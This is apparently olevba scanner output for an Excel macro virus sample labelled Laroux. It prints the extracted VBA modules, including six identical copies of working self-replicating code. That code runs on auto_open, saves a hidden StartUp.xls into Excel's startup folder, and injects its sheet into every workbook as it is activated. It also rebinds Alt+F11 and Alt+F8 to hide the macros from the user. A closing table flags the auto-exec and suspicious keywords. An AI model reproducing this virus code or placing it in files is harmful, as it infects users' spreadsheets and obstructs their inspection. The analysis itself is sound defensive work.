olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Laroux.jj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DataSet.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/DataSet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub OpenDataSetFile()
        Workbooks.OpenText Filename:="C:\MCFrame\mcf361\temp\_datasettaman.txt", Tab:=True _
        , FieldInfo:=Array( _
Array(1, 2), Array(2, 2), Array(3, 2), Array(4, 2), Array(5, 2), Array(6, 2), Array(7, 1), Array(8, 2), Array(9, 2), Array(10, 2), Array(11, 2), Array(12, 2), Array(13, 2), Array(14, 2), Array(15, 2), Array(16, 2), Array(17, 1), Array(18, 2), Array(19, 2), Array(20, 1), Array(21, 2), Array(22, 2), Array(23, 2), Array(24, 2), Array(25, 2), Array(26, 2), Array(27, 2), Array(28, 2), Array(29, 1), Array(30, 1), Array(31, 2), Array(32, 1), Array(33, 1), Array(34, 1), Array(35, 1), Array(36, 2), Array(37, 2), Array(38, 2), Array(39, 2), Array(40, 2), Array(41, 2), Array(42, 2), Array(43, 2), Array(44, 2), Array(45, 2), Array(46, 2), Array(47, 1))
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_2.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_3.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_4.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_5.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_6.bas 
in file: ./Virus.MSExcel.Laroux.jj - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  DataSe
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartUp_
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

